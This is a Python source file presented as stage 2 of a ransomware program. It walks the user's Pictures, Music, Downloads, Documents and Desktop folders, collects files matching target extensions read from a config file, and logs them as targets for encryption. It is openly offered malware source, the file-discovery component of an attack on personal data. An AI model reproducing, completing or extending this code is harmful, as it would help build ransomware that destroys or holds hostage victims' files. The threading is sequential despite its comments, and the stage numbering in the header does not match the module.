#!/usr/bin/env python

#=========================================================
#This Module is Written to Execute Stage2 of Ransomeware
#=========================================================
# Stage1
#	|____*****TAKES NO ARGUMENTS*****
#	|____Searches for Target Extension Files on Different Thread
#	|____*****RETURN : List of TARGET Files*****


import os, time
import threading #Using Threads to Boost Search Process BY Searching Diff. Drive on Diff. Thread
from os.path import expanduser
from pathlib import Path #Used to Find the Home Path
import configparser, ast  #Used to Retrive Settings from config.txt


#Stage2 is Initiated By (Stage2 Class), which depends on (LocateTargetFiles Class)
class Stage2:
    def __init__(self):
        self.list_of_files = []

    def start(self):               
        home = self.get_home_dir()
        target1 = home + "Pictures"
        target2 = home + "Music"
        target3 = home + "Downloads"
        target4 = home + "Documents"
        target5 = home + "Desktop"
            
        t1 = threading.Thread(target=self.run_locate_class, args=[target1,])
        t2 = threading.Thread(target=self.run_locate_class, args=[target2,])
        t3 = threading.Thread(target=self.run_locate_class, args=[target3,])
        t4 = threading.Thread(target=self.run_locate_class, args=[target4,])
        t5 = threading.Thread(target=self.run_locate_class, args=[target5,])
        t1.start()   
        t1.join()   
        t2.start() 
        t2.join() 
        t3.start() 
        t3.join() 
        t4.start() 
        t4.join() 
        t5.start()
        t5.join()
        
        with open('log.txt' , 'w') as f:
            for files in self.list_of_files:
                f.write(files+'\n')
                
        return self.list_of_files
    
    def get_home_dir(self):
        return str(Path.home()) + '\\'
    
    def run_locate_class(self, drive_name):
        '''
        Function to make Object of LocateTargetFiles Class
        '''
        starting = LocateTargetFiles()
        list_of_files = starting.start(drive_name)
        self.list_of_files.extend(list_of_files)
        return True

class LocateTargetFiles:
    def __init__(self, exclude = None):
        self.files_on_system = []
        
        config = configparser.RawConfigParser()
        config.read('config.txt')
        self.target_extension = ast.literal_eval(config.get("TARGET_EXTENSIONS", "list1"))  #Retriving From config.txt 
        self.exclude_dir = ast.literal_eval(config.get("EXCLUDED_DIRECTORY", "list1"))   #Retriving From config.txt
        if exclude != None:
            self.exclude_dir.extend(exclude)

    def start(self, root_dir):
        self.locate_files(root_dir)
        return self.files_on_system

    def locate_files(self, root_dir):
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)
                self.filter(self.target_extension, abs_file_path)
                
    def filter(self, target_extension, abs_file_path):
        if self.is_excluded_dir(abs_file_path) == False:
            # Filtering Files On the basics of file extension 
            if abs_file_path.split('.')[-1] in self.target_extension and abs_file_path.split('\\')[-1] != 'log.txt':
                self.files_on_system.append(abs_file_path) 
            else:
                pass

    def is_excluded_dir(self, path):
        '''
        @summary: Checks whether the specified path should be excluded from encryption
        @param path: The path to check
        @return: True if the path should be excluded from encryption, otherwise False
        '''
      
        for dir_to_exclude in self.exclude_dir:
            lenght = len(dir_to_exclude)
            if path[:lenght] == dir_to_exclude:
                return True          
        return False            
        
            
    
                 

if __name__ == '__main__':
    test = Stage2()
    list_of_files = test.start()
    
    print(f"[+] Total Number of Files : {len(list_of_files)}\n")
    
    time.sleep(4)
    for file in list_of_files:
        print(file)
    
    '''
    #Testing Class == LocateTargetFiles
    absolue_path = input("Enter Absolute Path : ")
    exclude_dir = ['C:\\Users\\satender singh\\Desktop\\Ransomeware\\2',]

    test = LocateTargetFiles(exclude_dir)
    files_on_system = test.start(absolue_path)

    for file in files_on_system:
        print(file)
    '''        
